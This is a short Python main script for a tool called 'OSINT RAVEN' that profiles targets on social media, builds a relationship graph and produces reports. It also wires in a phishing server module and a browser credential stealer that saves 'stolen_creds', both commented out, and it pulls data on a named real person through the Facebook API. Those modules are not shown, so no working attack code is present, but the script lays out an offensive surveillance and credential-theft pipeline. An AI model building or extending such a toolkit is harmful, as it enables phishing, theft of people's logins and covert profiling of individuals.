#!/usr/bin/env python3
"""
OSINT RAVEN - Main Orchestrator
"""
import sys
from pathlib import Path
sys.path.append(str(Path(__file__).parent))

from modules import api_collectors, stealth_crawler, phish_server, cred_stealer, entity_resolver, graph_analyzer, visualizer, reporter
from modules.utils import ensure_dir, save_json
from config import FACEBOOK_ACCESS_TOKEN, INSTAGRAM_ACCESS_TOKEN

def main():
    print("[+] OSINT RAVEN starting...")
    ensure_dir('data')
    ensure_dir('logs')
    
    resolver = entity_resolver.EntityResolver()
    
    # 1. API Collection
    if FACEBOOK_ACCESS_TOKEN:
        fb = api_collectors.FacebookCollector(FACEBOOK_ACCESS_TOKEN)
        # Example: collect from a target
        try:
            user = fb.get_user('4')  # Mark Zuckerberg
            resolver.add_entity('fb_4', 'facebook', user)
        except Exception as e:
            print(f"FB API error: {e}")
    
    # 2. Stealth Crawling
    crawler = stealth_crawler.StealthCrawler()
    # Example: scrape a profile page
    # html = crawler.run('https://www.instagram.com/example/')
    # Extract data from html...
    
    # 3. Phishing server (run in background or separate process)
    # Uncomment to start phishing server (blocking)
    # phish_server.start_phish_server()
    
    # 4. Credential stealing (simulated)
    # stealer = cred_stealer.BrowserCredStealer()
    # creds = stealer.steal()
    # save_json(creds, 'data/stolen_creds.json')
    
    # 5. Entity resolution
    resolver.resolve()
    
    # 6. Graph analysis
    analyzer = graph_analyzer.GraphAnalyzer(resolver.entities, resolver.relations)
    analyzer.compute_centrality()
    analyzer.detect_communities()
    susp = analyzer.find_suspicious_clusters()
    print(f"Suspicious nodes: {susp}")
    
    # 7. Visualization
    viz = visualizer.Visualizer(analyzer.G)
    viz.plot_static('data/network.png')
    viz.plot_interactive('data/network.html')
    
    # 8. Report
    reporter.ReportGenerator.generate_html(resolver.entities, resolver.relations, 'network.png', 'data/report.html')
    
    print("[+] Done. Check data/ directory.")

if __name__ == '__main__':
    main()